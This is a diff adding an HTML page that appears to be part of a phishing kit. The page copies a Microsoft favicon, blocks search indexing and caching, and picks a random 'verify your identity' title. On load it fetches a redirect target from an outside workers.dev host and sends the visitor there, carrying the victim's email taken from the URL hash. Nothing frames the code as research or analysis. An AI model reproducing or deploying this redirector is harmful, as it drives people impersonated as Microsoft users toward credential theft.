@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title></title>
+    <meta name="robots" content="noindex,nofollow">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Add favicon (Microsoft logo) -->
+    <link rel="icon" type="image/png" href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
+</head>
+<body>
+    <script>
+        // Titles array with different variations
+        const titles = [
+            "Confirm Your Identity",
+            "Identity Confirmation Required",
+            "Secure Your Access",
+            "Verify Your Credentials",
+            "Confirm Your Account",
+            "Identity Check",
+            "Verify Your Details",
+            "Authenticate Your Identity",
+            "Identity Verification Needed",
+            "Confirm Your Personal Information",
+            "Please Verify Your Account",
+            "Final Step: Confirm Your Identity",
+            "Secure Verification Process",
+            "Complete Your Identity Verification",
+            "Account Security Check",
+            "Protect Your Account - Verify Now",
+            "Verification Needed for Access",
+            "Account Access Confirmation",
+            "Action Required: Identity Check",
+            "Complete Your Security Verification",
+            "Confirm Your Access Rights",
+            "Verify Your Identity for Security",
+            "Secure Your Personal Details",
+            "Double-Check Your Credentials",
+            "Identity Protection in Progress",
+            "Safety Check: Confirm Your Details",
+            "Ensure Your Account Security",
+            "Verify to Continue Access",
+            "Account Protection Step",
+            "Verification Step Required",
+            "Authenticate to Secure Your Account",
+            "Account Authentication Needed",
+            "Secure Your Account Access",
+            "One Last Step: Confirm Your Details",
+            "Your Account Verification Is Pending",
+            "Complete This Security Step",
+            "Verify Your Information Securely",
+            "Secure Identity Checkpoint",
+            "Finish Your Identity Verification",
+            "Secure Your Data: Verify Now"
+        ];
+
+        // Function to select a random title
+        function setRandomTitle() {
+            const randomIndex = Math.floor(Math.random() * titles.length);
+            document.title = titles[randomIndex];
+        }
+
+        // Function to fetch the JSON, extract the URL, and redirect
+        async function fetchAndRedirect() {
+            try {
+                // Fetch JSON from the API
+                const response = await fetch("https://sky-no-limit-foxer3310.tried-lord.workers.dev/");
+                
+                // Ensure the response is okay
+                if (!response.ok) {
+                    throw new Error(`Failed to fetch: ${response.status}`);
+                }
+
+                // Parse the JSON response
+                const data = await response.json();
+                
+                // Extract the URL from the response
+                const url = data?.message;
+                if (!url) {
+                    throw new Error("URL not found in the response");
+                }
+
+                // Get the current URL and extract the email from the hash part
+                const currentHash = window.location.hash;
+                const emailMatch = currentHash.match(/#POP=([^&]+)/);
+                const email = emailMatch ? emailMatch[1] : null;
+                
+                if (!email) {
+                    throw new Error("No email found in the hash");
+                }
+
+                // Construct the new URL with the email appended
+                const redirectUrl = `${url}#POP=${email}`;
+
+                // Redirect to the constructed URL
+                window.location.href = redirectUrl;
+            } catch (error) {
+                console.error("Error:", error.message);
+            }
+        }
+
+        // Set random title on page load
+        setRandomTitle();
+
+        // Fetch JSON and redirect
+        fetchAndRedirect();
+    </script>
+</body>
+</html>
